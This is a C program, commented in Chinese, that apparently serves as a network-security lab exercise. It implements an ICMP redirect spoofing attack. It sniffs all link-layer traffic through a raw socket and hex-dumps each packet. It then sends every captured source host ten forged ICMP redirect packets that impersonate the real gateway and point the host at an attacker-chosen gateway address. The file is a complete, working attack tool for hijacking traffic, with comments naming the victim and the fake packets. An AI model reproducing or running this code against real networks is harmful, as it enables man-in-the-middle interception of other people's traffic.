#include<stdlib.h>
#include<sys/socket.h>
#include<netinet/ip_icmp.h>
#include<netinet/in.h>
#define __FAVOR_BSD
#include<netinet/udp.h>
#include<netinet/ip.h>
#include<arpa/inet.h>
#include<netinet/ether.h>
#include <unistd.h>//sleep
#include<string.h>
#include<stdio.h>
void send_icmptime(int sockfd, struct sockaddr *sa, socklen_t len,char *srcdata);
uint16_t in_cksum(uint16_t *addr, int len);
#define MAXLINE 1024


void main()
{
	int sockfd,rawsock;
	unsigned char buff1[MAXLINE];
	int n;
	int count=0;
	rawsock=socket(PF_PACKET,SOCK_RAW,htons(ETH_P_IP)); // 建立原始套接字，可以接收和发送以太网帧
	if(rawsock < 0)
		{
			//建立rawsocket来监听链路层的包
			printf("raw socket error!\n");
			exit(1);
		}
	if( (sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
		{
			//建立sockfd来发送重定向包
			perror("socket");
			exit(2);
		}
	while(1)
		{
			n = recvfrom(rawsock,buff1,MAXLINE,0,NULL,NULL)-14;
			if(n<0)
				{
					printf("receive error!\n");
					exit(1);
				}
			unsigned char *buff = buff1+14;//数据链路层帧14个字节开始是ip
			struct ip *ip = (struct ip*)buff;
			//捕获到的数据包
			printf("%4d	%15s",count,inet_ntoa(ip->ip_src));
			printf("%15s	%5d	%5d\n",inet_ntoa(ip->ip_dst),ip->ip_p,ntohs(ip->ip_len));

			int i=0,j=0;
			for(i=0; i<n; i++)
				{
					if(i!=0 && i%16==0)
						{
							printf("	");
							for(j=i-16; j<i; j++)
								{
									if(buff[j]>=32&&buff[j]<=128)
										printf("%c",buff[j]);
									else printf(".");
								}
							printf("\n");
						}
					if(i%16 == 0) printf("%04x	",i);
					printf("%02x",buff[i]);

					if(i==n-1)
						{
							for(j=0; j<15-i%16; j++) printf("  ");
							printf("	");
							for(j=i-i%16; j<=i; j++)
								{
									if(buff[j]>=32&&buff[j]<127)
										printf("%c",buff[j]);

								}

						}

				}

			printf("\n\n");

			struct sockaddr_in target;
			target.sin_family = AF_INET;
			target.sin_addr=ip->ip_src;
			//准备攻击的ip是捕获到的源ip
                        for(i=0;i<10;i++)
			send_icmptime(sockfd, (struct sockaddr *)&target, sizeof(target),buff);
		}

}

void send_icmptime(int sockfd, struct sockaddr *s, socklen_t len,char *srcdata)
{


	struct in_addr myaddr;
	inet_pton(AF_INET, "192.168.9.69", &myaddr);
	//将重定向的网关ip写入myaddr数据结构

	struct icmp *icmp;
	struct timeval val;
	struct ip *ip1;

	ip1 = (struct ip *)malloc(56);
	ip1->ip_v = 4;
	ip1->ip_hl = 5;
	ip1->ip_tos = 0;
	ip1->ip_len = 56;
	ip1->ip_id = 0;
	ip1->ip_off = 0;
	ip1->ip_ttl = 64;
	ip1->ip_p = IPPROTO_ICMP;
	ip1->ip_sum = 0;

	inet_pton(AF_INET, "192.168.8.1", &ip1->ip_src);
	//真的网关的地址
	//inet_pton(AF_INET, "127.0.0.1", &ip1->ip_dst);
        ip1->ip_dst=((struct ip*)srcdata)->ip_src;
	//被攻击的地址

	icmp = (struct icmp *)((char *)ip1 + 20);
	icmp->icmp_type = ICMP_REDIRECT;
	icmp->icmp_code = ICMP_REDIRECT_HOST;
	icmp->icmp_cksum = 0;
	icmp->icmp_gwaddr = myaddr;

	//icmp包头

	char *ip_data;
	ip_data = ((char *)icmp + 8);
	//这里使用strcpy无法实现，因为srcdata中有0，遇到0会自动停止
	int i=0;
	for(i=0; i<28; i++)
		ip_data[i]=srcdata[i];
	struct ip *ip =(struct ip*)ip_data;
	// icmp重定向包包含的原始ip数据报的内容
	// ip->ip_v = 4;
	// ip->ip_hl = 5;
	// ip->ip_tos = 0;
	 ip->ip_len = htons(22);
	// ip->ip_id = 0;
	// ip->ip_off = 0;
	// ip->ip_ttl = 54;
	// //ip->ip_p = IPPROTO_UDP;
	// ip->ip_sum = 0;
	// inet_pton(AF_INET, "192.168.0.64", &ip->ip_src);
	// inet_pton(AF_INET, "123.125.114.144", &ip->ip_dst);
	//原始数据报的源ip和目的ip
	ip->ip_sum = in_cksum((u_short *)ip, 20);

	// struct udphdr *udp;
	// udp = (struct udphdr*)((char *)ip + 20);
	// udp->uh_sport =  6666;
	// udp->uh_dport =  6666;
	// udp->uh_ulen = htons(55);
	// udp->uh_sum = in_cksum((u_short *)udp, 8);
	icmp->icmp_cksum = in_cksum((u_short *)icmp, 36);

	//发送假的icmp重定向包
	if(sendto(sockfd, ip1, 56, 0 ,s, len) < 0)
		perror("sendto");
}
uint16_t in_cksum(uint16_t *addr, int len)
{
	int nleft = len;
	uint32_t sum = 0;
	uint16_t *w = addr;
	uint16_t answer = 0;
	while(nleft > 1)
		{
			sum += *w++;
			nleft -= 2;
		}
	if(nleft == 1)
		{
			*(unsigned char *)(&answer) = *(unsigned char *)w;
			sum += answer;
		}
	sum = ( sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer =~sum;
	return answer;

}
